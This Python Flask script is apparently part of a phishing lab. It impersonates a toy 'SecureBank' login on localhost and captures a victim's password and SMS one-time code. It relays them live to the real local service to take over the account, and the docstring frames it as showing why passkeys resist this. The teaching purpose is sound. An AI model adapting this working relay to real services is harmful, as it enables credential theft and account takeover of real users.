#!/usr/bin/env python3
"""
phishing_relay.py  --  The ATTACKER's fake site (real-time OTP relay).

This is the whole point of the lab. A static fake login page can steal a
password, but a password alone is useless against 2FA. So a *real* phishing
kit acts as a live man-in-the-middle: the moment the victim types anything,
the attacker replays it to the REAL service and pushes the real service's
prompts back to the victim. The victim's phone rings with a genuine OTP
(because the attacker really did start a login), the victim types it in, and
the attacker relays THAT too -- completing the login on their own machine.

This demonstrates the key lesson: SMS OTP does not bind the code to who is
actually logging in, so it can be relayed. Phishing-resistant factors
(passkeys / FIDO2) break exactly this step -- see README.

Run (in a second terminal, with real_service.py already running):
    python3 attack/phishing_relay.py       # listens on http://127.0.0.1:8000

Then, as the "victim," browse to http://127.0.0.1:8000 and log in with the
lab credentials. Watch BOTH server consoles.
"""

import requests
from flask import Flask, request, session, redirect, url_for

REAL = "http://127.0.0.1:5000"      # the site being impersonated
app = Flask(__name__)
app.secret_key = "attacker-lab-key"  # attacker's own session store

# Loot the attacker collects, printed as it arrives.
def log(msg):
    print(f"[phish] {msg}")


PAGE = """
<!doctype html><title>SecureBank Login</title>
<h2>SecureBank &mdash; Sign in</h2>
<p style="color:#a00">(This is the ATTACKER'S look-alike page. Note the URL: port 8000, not the real site.)</p>
<form method="post" action="/step1">
  <p>Username: <input name="username"></p>
  <p>Password: <input name="password" type="password"></p>
  <button>Sign in</button>
</form>
"""

OTP_PAGE = """
<!doctype html><title>SecureBank Verify</title>
<h2>Enter the code we texted you</h2>
<p>{note}</p>
<form method="post" action="/step2">
  <p>Code: <input name="otp"></p>
  <button>Verify</button>
</form>
"""


@app.route("/")
def home():
    return PAGE


@app.route("/step1", methods=["POST"])
def step1():
    """Capture creds, then RELAY them to the real service to trigger a real OTP."""
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    log(f"CAPTURED credentials -> {username} / {password}")

    # The attacker replays the stolen creds to the genuine site.
    r = requests.post(f"{REAL}/login",
                      data={"username": username, "password": password},
                      timeout=5).json()

    if not r.get("ok"):
        return "Login failed on the real service (bad creds). " \
               "<a href='/'>try again</a>"

    # Stash the real service's login ticket so we can relay the OTP next.
    session["ticket"] = r["ticket"]
    log(f"RELAYED creds to real service -> real OTP just sent to victim's phone")
    return OTP_PAGE.format(note=r.get("note", ""))


@app.route("/step2", methods=["POST"])
def step2():
    """Capture the OTP the victim types and RELAY it to complete the takeover."""
    otp = request.form.get("otp", "")
    ticket = session.get("ticket", "")
    log(f"CAPTURED OTP -> {otp}")

    r = requests.post(f"{REAL}/verify",
                      data={"ticket": ticket, "otp": otp},
                      timeout=5).json()

    if r.get("ok"):
        log("SUCCESS -> attacker completed login on the REAL service. "
            "This is the account-takeover moment.")
        return ("<h2>('Login successful' -- shown to the victim to avoid suspicion.)</h2>"
                "<p style='color:#a00'>Behind the scenes the attacker now holds a "
                "valid session on the real SecureBank. Check the phish console.</p>")
    log(f"OTP relay failed: {r.get('error')}")
    return "Verification failed. <a href='/'>try again</a>"


if __name__ == "__main__":
    print("Attacker relay on http://127.0.0.1:8000  (impersonating SecureBank at :5000)")
    print("Log in here as the 'victim' and watch the codes get relayed live.\n")
    app.run(host="127.0.0.1", port=8000, debug=False)
